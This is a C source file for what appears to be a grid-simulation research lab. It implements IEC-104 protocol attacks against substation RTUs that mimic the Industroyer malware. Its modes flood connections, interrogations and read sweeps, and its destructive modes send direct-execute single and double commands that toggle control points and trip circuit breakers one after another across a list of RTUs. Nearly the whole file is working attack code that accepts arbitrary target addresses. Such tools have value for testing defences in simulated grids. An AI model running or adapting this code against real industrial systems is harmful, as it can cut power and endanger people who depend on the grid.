/*
* attack_iec104_misuse.c
*
* Generates protocol-valid IEC-104 traffic patterns that are comparable to that produced by
* the Industroyer malware, targetting the IEC-60870-104 protocol. The script targets legitimate
* protocol mechanisms such as: connections, STARTDT/STOPDT, interrogation, and read requests in
* order to create malicious behaviour implementing destructive protocol commands.
* 
* Run examples:
*   ./attack_iec104_misuse 10.0.0.5 2404 conn_churn 200
*   ./attack_iec104_misuse 10.0.0.5 2404 start_stop 500
*   ./attack_iec104_misuse 10.0.0.5 2404 interrogate 250
*   ./attack_iec104_misuse 10.0.0.5 2404 read_sweep 200 1 100
*
*/

#include "hal_time.h" // For sleep/timing
#include "hal_thread.h" // Thread sleep
#include "cs104_connection.h" // IEC-104 client connection api (lib60870-C) module of the SGSim emulator
#include "cs101_information_objects.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <time.h>
#include <stdint.h>
#include <pthread.h>

/* Global Run Flag.
* Volatile keyword prevents the compiler from optimising repeated reads away
* Update by signal handler to stop loops cleanly (Ctrl+C / SIGTERM)
*/
static volatile int keepRunning = 1;


static void onSigInt(int sig)
/* Handle SIGINT/SIGTERM for shutdown*/
{
    (void)sig; // Suppresses unused parameter warnings
    keepRunning = 0; // Causes loops to exit and resource-cleanup
}


static void usage(const char* prog)
// CLI Help
{
    printf("Usage:\n");
    printf("  %s <ip> [port] [mode] [rate_ms] [ioa_min] [ioa_max] [ca]\n", prog);
    printf("\n");
    printf("Modes:\n");
    printf("  conn_churn    - open/close connections repeatedly\n");
    printf("  start_stop    - STARTDT/STOPDT toggling on one connection\n");
    printf("  interrogate   - repeated interrogation commands\n");
    printf("  read_sweep    - repeated read commands over IOA range\n");
    printf("  single_cmd    - repeated C_SC_NA_1 ON/OFF toggle (Industroyer-style, IOA 5000)\n");
    printf("  breaker_trip  - repeated C_DC_NA_1 OPEN/CLOSE commands (Industroyer-2-style)\n");
    printf("  industroyer2  - multi-RTU sequential breaker attack (Industroyer-2 realistic)\n");
    printf("                  Accepts comma-separated IPs. Pivots RTU-by-RTU sequentially.\n");
    printf("\n");
    printf("Defaults:\n");
    printf("  port=2404, mode=read_sweep, rate_ms=250, ioa_min=1, ioa_max=50, ca=1\n");
    printf("\n");
    printf("SGSim targets:\n");
    printf("  DSS1RTU: 1.1.1.1:2404\n");
    printf("  DSS2RTU: 1.1.2.1:2404\n");
    printf("\n");
    printf("Examples:\n");
    printf("  %s 1.1.1.1 2404 single_cmd   1000 5000 5000 1\n", prog);
    printf("  %s 1.1.1.1 2404 breaker_trip 1000 5000 5000 1\n", prog);
    printf("  %s \"1.1.1.1,1.1.2.1\" 2404 industroyer2 3000 5000 5004 1\n", prog);
}

static void connectionHandler(void* parameter, CS104_Connection connection, CS104_ConnectionEvent event)
/* Connection event callback:
* The IEC-104 library notifies when the connection state changes.
* This is to help verify behaviour in logs and to correlate events with packet captures.
*/
{
    (void)parameter;
    (void)connection;

    switch(event) {
    case CS104_CONNECTION_OPENED:
        printf("[*] Connection opened\n");
        break;
    case CS104_CONNECTION_CLOSED:
        printf("[*] Connection closed\n");
        break;
    case CS104_CONNECTION_STARTDT_CON_RECEIVED:
        printf("[*] STARTDT_CON received\n");
        break;
    case CS104_CONNECTION_STOPDT_CON_RECEIVED:
        printf("[*] STOPDT_CON received\n");
        break;
    default:
        break;
    }
}

static void run_conn_churn(const char* ip, uint16_t port, int rateMs)
/* MODE: conn_churn
* Behaviour:
* - Create a connection, connect, send STARTDT, optionally STOPDT, close -> Repeat at chosen rate
*
* Produces many short-lived TCP sessions to p2404
* Demonstrates misuse without payload sabotage
* Used to evaluate ACL/fw handling of session storms/state tracking
*/
{
    while (keepRunning) {
        // Create IEC-104 connection handle
        CS104_Connection con = CS104_Connection_create(ip, port);
        CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

        // Attempt to establish TCP session and IEC-104 connection state
        if (CS104_Connection_connect(con)) {
            // STARTDT requests the peer to start data transfer
            CS104_Connection_sendStartDT(con);

            // Wait
            Thread_sleep(rateMs);

            // STOPDT requests the peer to stop data transfer
            CS104_Connection_sendStopDT(con);
        }

        // Always destroy handle to free resources (even during failed connections)
        CS104_Connection_destroy(con);

        // Pause between churn cycles
        Thread_sleep(rateMs);
    }
}

static void run_start_stop(const char* ip, uint16_t port, int rateMs)
/* MODE: start_stop
*
* Behaviour:
* - Keeps one connection open and repeatedly send STARTDT/STOPDT toggles
*
* Generates irregular protocol state transitions while remaining true to normal protocol behaviour
* Can help show why port-based ACLs cannot detect intent/abuse
*/
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if(!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    while (keepRunning) {
        CS104_Connection_sendStartDT(con);
        Thread_sleep(rateMs);

        CS104_Connection_sendStopDT(con);
        Thread_sleep(rateMs);
    }
    
    CS104_Connection_destroy(con);
}

static void run_interrogate(const char* ip, uint16_t port, int rateMs)
/* MODE: interrogate
*
* Behaviour:
* - Opens a connection, and enables data transfer (STARTDT), sends repeated interrogation commands at chosen rate
* 
* Interrogation is a legitimate functionality used to request station information, typically during startup/recovery/SCADA sync.
* 
* High interrogation rates are irregular, but they are syntactically valid. FW/ACLs typically cannot differentiate between legitimate vs misused
*/
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    // Enable data transfer
    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    while(keepRunning) {
        /* Send station interrogation:
        * - CS101_COT_ACTIVATION: "activation cause-of-transmission"
        * - 1: Common address of ASDU
        * - IEC60870_QOI_STATION: station interrogation qualifier
        */
       CS104_Connection_sendInterrogationCommand(con, CS101_COT_ACTIVATION, 1, IEC60870_QOI_STATION);
       Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

static void run_read_sweep(const char* ip, uint16_t port, int rateMs, int ioaMin, int ioaMax)
/* MODE: read_sweep
*
* Behaviour:
* - Opens a connection and enables data transfer (STARTDT), repeadetly sends read-requests for IOAs in a numeric range
*
* Produces a recognisable pattern in packet captures which can be measured. This represents protocol-valid "reconnaisance / inventory" behaviour.
*/
{
    // Ensure min <= max
    if (ioaMin > ioaMax) {
        int tmp = ioaMin;
        ioaMin = ioaMax;
        ioaMax = tmp;
    }

    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);
    
    if(!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    // Enable data transfer
    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    int ioa = ioaMin;

    
    while (keepRunning) {
        /* Send a read  command for the current IOA.
         * Parameters:
         *  - 0: common address (depends on your setup; often 0 or 1 in demos)
         *  - ioa: information object address to read
         */
        CS104_Connection_sendReadCommand(con, 1, ioa);

        // Move to the next IOA, wrap at end of range
        ioa++;
        if (ioa > ioaMax)
            ioa = ioaMin;

        Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

static void run_single_cmd(const char* ip, uint16_t port, int rateMs, int ioa, int caAddr)
/* MODE: single_cmd
 *
 * Behaviour:
 * - Opens a connection, enables data transfer (STARTDT), then repeatedly sends
 *   C_SC_NA_1 Single Commands toggling ON (1) and OFF (0) to the specified IOA.
 *
 * IOA 5000 is the control point registered in rtu.c's asduHandler.
 * The RTU responds with ACT_CON (activation confirmation).
 *
 * This is the simplest Industroyer-style command injection: a valid protocol command
 * at a valid IOA that is indistinguishable from a legitimate SCADA command.
 *
 * TypeID: C_SC_NA_1 (45) — Single Command
 * COT:    CS101_COT_ACTIVATION (6)
 */
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    int state = 1; /* toggle between ON(1) and OFF(0) */
    printf("[*] Starting single_cmd: ip=%s ioa=%d ca=%d rate_ms=%d\n", ip, ioa, caAddr, rateMs);

    while (keepRunning) {
        /*
         * SingleCommand_create(self, ioa, command, selectCommand, qu)
         *   self          = NULL  (allocate new instance)
         *   ioa           = information object address
         *   command       = 1 (ON/CLOSE) or 0 (OFF/OPEN)
         *   selectCommand = false -> direct execute (no select-before-operate)
         *   qu            = 0 -> no additional definition
         */
        InformationObject sc = (InformationObject)
            SingleCommand_create(NULL, ioa, state, false, 0);

        printf("[>] C_SC_NA_1 %s -> IOA=%-5d CA=%d\n", state ? "ON " : "OFF", ioa, caAddr);
        CS104_Connection_sendProcessCommand(con, C_SC_NA_1, CS101_COT_ACTIVATION, caAddr, sc);
        InformationObject_destroy(sc);

        state = !state; /* toggle state for next iteration */
        Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

static void run_breaker_trip(const char* ip, uint16_t port, int rateMs, int ioa, int caAddr)
/* MODE: breaker_trip
 *
 * Behaviour:
 * - Opens a connection, enables data transfer (STARTDT), then repeatedly sends
 *   C_DC_NA_1 Double Commands: OPEN (state=1) then CLOSE (state=2).
 *
 * This replicates the Industroyer-2 IEC-104 payload component.
 * Double Command (C_DC_NA_1, TypeID=46) is the correct type for circuit breakers
 * because breakers have an intermediate transition state that Single Command cannot express.
 *
 * DoubleCommand state values (IEC 60870-5-101 Table 64):
 *   0 = not permitted
 *   1 = OFF -> OPEN the breaker (trip / de-energise the feeder)
 *   2 = ON  -> CLOSE the breaker (re-energise)
 *   3 = not permitted
 *
 * TypeID: C_DC_NA_1 (46) — Double Command
 * COT:    CS101_COT_ACTIVATION (6)
 */
{
    CS104_Connection con = CS104_Connection_create(ip, port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[!] Connect failed\n");
        CS104_Connection_destroy(con);
        return;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    printf("[*] Starting breaker_trip: ip=%s ioa=%d ca=%d rate_ms=%d\n", ip, ioa, caAddr, rateMs);

    while (keepRunning) {
        /*
         * OPEN the breaker (TRIP / de-energise)
         * DoubleCommand_create(self, ioa, command, selectCommand, qu)
         *   command       = 1 (OFF = OPEN)
         *   selectCommand = false -> direct execute
         *   qu            = 0 -> no additional definition
         */
        InformationObject dc_open = (InformationObject)
            DoubleCommand_create(NULL, ioa, 1, false, 0);

        printf("[>] C_DC_NA_1 OPEN  (trip)  -> IOA=%-5d CA=%d\n", ioa, caAddr);
        CS104_Connection_sendProcessCommand(con, C_DC_NA_1, CS101_COT_ACTIVATION, caAddr, dc_open);
        InformationObject_destroy(dc_open);

        Thread_sleep(rateMs);
        if (!keepRunning) break;

        /* CLOSE the breaker (re-energise)
         *   command = 2 (ON = CLOSE)
         */
        InformationObject dc_close = (InformationObject)
            DoubleCommand_create(NULL, ioa, 2, false, 0);

        printf("[>] C_DC_NA_1 CLOSE (reset) -> IOA=%-5d CA=%d\n", ioa, caAddr);
        CS104_Connection_sendProcessCommand(con, C_DC_NA_1, CS101_COT_ACTIVATION, caAddr, dc_close);
        InformationObject_destroy(dc_close);

        Thread_sleep(rateMs);
    }

    CS104_Connection_destroy(con);
}

/* Parameters passed to the per-RTU attack function for the industroyer2 mode */
typedef struct {
    const char* ip;
    uint16_t port;
    int rateMs;
    int ioaMin;
    int ioaMax;
    int caAddr;
} target_params_t;

static int industroyer2_attack_rtu(const target_params_t* p)
/* Attack a single RTU: connect, send STARTDT, walk IOAs, disconnect.
 *
 * Behaviour:
 * - Connects to the RTU on the given port
 * - Sends STARTDT
 * - Walks through IOAs from ioaMin to ioaMax, sending C_DC_NA_1 OPEN (state=1)
 * - Waits rateMs between each command
 * - Disconnects when done (or when keepRunning is cleared)
 *
 * Returns the number of commands sent (>= 0) on success, or -1 on connection failure.
 */
{
    CS104_Connection con = CS104_Connection_create(p->ip, p->port);
    CS104_Connection_setConnectionHandler(con, connectionHandler, NULL);

    if (!CS104_Connection_connect(con)) {
        printf("[RTU %s] Connect failed\n", p->ip);
        CS104_Connection_destroy(con);
        return -1;
    }

    CS104_Connection_sendStartDT(con);
    Thread_sleep(500);

    int cmdCount = 0;
    for (int ioa = p->ioaMin; ioa <= p->ioaMax && keepRunning; ioa++) {
        InformationObject dc_open = (InformationObject)
            DoubleCommand_create(NULL, ioa, 1, false, 0);

        printf("[RTU %s] C_DC_NA_1 OPEN -> IOA=%d CA=%d\n", p->ip, ioa, p->caAddr);
        CS104_Connection_sendProcessCommand(con, C_DC_NA_1, CS101_COT_ACTIVATION,
                                            p->caAddr, dc_open);
        InformationObject_destroy(dc_open);
        cmdCount++;

        Thread_sleep(p->rateMs);
    }

    CS104_Connection_destroy(con);
    return cmdCount;
}

static void run_industroyer2(const char* ipList, uint16_t port, int rateMs,
                              int ioaMin, int ioaMax, int caAddr)
/* MODE: industroyer2
 *
 * Behaviour:
 * - Parses a comma-separated list of target RTU IPs
 * - Pivots sequentially from one RTU to the next (finishes all IOA commands on
 *   RTU 1 before connecting to RTU 2), matching real Industroyer-2 behaviour
 * - Does not loop — walks through IOAs once per RTU and exits
 *
 * Example: run_industroyer2("1.1.1.1,1.1.2.1", 2404, 3000, 5000, 5004, 1)
 */
{
#define MAX_TARGETS 64

    /* Validate input length before copying */
    if (strlen(ipList) >= 1024) {
        printf("[!] IP list too long (max 1023 characters)\n");
        return;
    }

    /* Parse the comma-separated IP list into an array */
    char ipBuf[1024];
    strncpy(ipBuf, ipList, sizeof(ipBuf) - 1);
    ipBuf[sizeof(ipBuf) - 1] = '\0';

    /* Count and collect IPs — ips[] holds pointers into ipBuf (via strtok). */
    const char* ips[MAX_TARGETS];
    int nTargets = 0;
    char* tok = strtok(ipBuf, ",");
    while (tok != NULL) {
        if (nTargets >= MAX_TARGETS) {
            printf("[!] Too many targets — only the first %d will be used\n", MAX_TARGETS);
            break;
        }
        ips[nTargets++] = tok;
        tok = strtok(NULL, ",");
    }

    if (nTargets == 0) {
        printf("[!] No target IPs specified\n");
        return;
    }

    printf("[*] industroyer2: targeting %d RTU(s), IOA %d-%d, rate=%dms, CA=%d\n",
           nTargets, ioaMin, ioaMax, rateMs, caAddr);

    /* Track results for the summary banner; initialise so partial runs are safe */
    int cmdsSent[MAX_TARGETS];
    int connected[MAX_TARGETS];
    for (int i = 0; i < MAX_TARGETS; i++) {
        cmdsSent[i]  = 0;
        connected[i] = 0;
    }

    /* Pivot sequentially through each RTU */
    for (int i = 0; i < nTargets && keepRunning; i++) {
        printf("[*] ---- Pivoting to RTU %d/%d: %s ----\n", i + 1, nTargets, ips[i]);

        target_params_t p;
        p.ip     = ips[i];
        p.port   = port;
        p.rateMs = rateMs;
        p.ioaMin = ioaMin;
        p.ioaMax = ioaMax;
        p.caAddr = caAddr;

        int result   = industroyer2_attack_rtu(&p);
        connected[i] = (result >= 0);
        cmdsSent[i]  = (result >= 0) ? result : 0;
    }

    /* Summary banner */
    printf("\n[*] ---- industroyer2 summary ----\n");
    for (int i = 0; i < nTargets; i++) {
        if (connected[i])
            printf("[*]   RTU %d/%d  %s  connected, %d command(s) sent\n",
                   i + 1, nTargets, ips[i], cmdsSent[i]);
        else
            printf("[*]   RTU %d/%d  %s  FAILED (no connection)\n",
                   i + 1, nTargets, ips[i]);
    }
    printf("[*] ----------------------------------\n");

#undef MAX_TARGETS
}

/* Program entry point:
* - Parse command line args
* - Pick a safe misuse mode
* - Run until interrupted
*/
int main(int argc, char** argv)
{
    // Ensure Ctrl+C stops the program cleanly
    signal(SIGINT, onSigInt);
    signal(SIGTERM, onSigInt);

    const char* ip   = (argc > 1) ? argv[1] : "127.0.0.1";
    uint16_t port    = (argc > 2) ? (uint16_t)atoi(argv[2]) : IEC_60870_5_104_DEFAULT_PORT;
    const char* mode = (argc > 3) ? argv[3] : "read_sweep";
    int rateMs       = (argc > 4) ? atoi(argv[4]) : 250;
    int ioaMin       = (argc > 5) ? atoi(argv[5]) : 1;
    int ioaMax       = (argc > 6) ? atoi(argv[6]) : 50;
    int caAddr       = (argc > 7) ? atoi(argv[7]) : 1;

    // If no IP is given, show help and use defaults
    if (argc < 2) {
        usage(argv[0]);
        printf("\n[*] Using defaults: ip=%s port=%u mode=%s rate_ms=%d ioa=[%d..%d] ca=%d\n",
               ip, port, mode, rateMs, ioaMin, ioaMax, caAddr);
    } else {
        printf("[*] ip=%s port=%u mode=%s rate_ms=%d ioa=[%d..%d] ca=%d\n",
               ip, port, mode, rateMs, ioaMin, ioaMax, caAddr);
    }

    // Dispatch to selected mode
    if      (strcmp(mode, "conn_churn")   == 0) run_conn_churn(ip, port, rateMs);
    else if (strcmp(mode, "start_stop")   == 0) run_start_stop(ip, port, rateMs);
    else if (strcmp(mode, "interrogate")  == 0) run_interrogate(ip, port, rateMs);
    else if (strcmp(mode, "read_sweep")   == 0) run_read_sweep(ip, port, rateMs, ioaMin, ioaMax);
    else if (strcmp(mode, "single_cmd")   == 0) run_single_cmd(ip, port, rateMs, ioaMin, caAddr);
    else if (strcmp(mode, "breaker_trip") == 0) run_breaker_trip(ip, port, rateMs, ioaMin, caAddr);
    else if (strcmp(mode, "industroyer2") == 0) run_industroyer2(ip, port, rateMs, ioaMin, ioaMax, caAddr);
    else {
        printf("[!] Unknown mode: %s\n", mode);
        usage(argv[0]);
        return 2;
    }
    
    printf("[*] Exit\n");
    return 0;
}
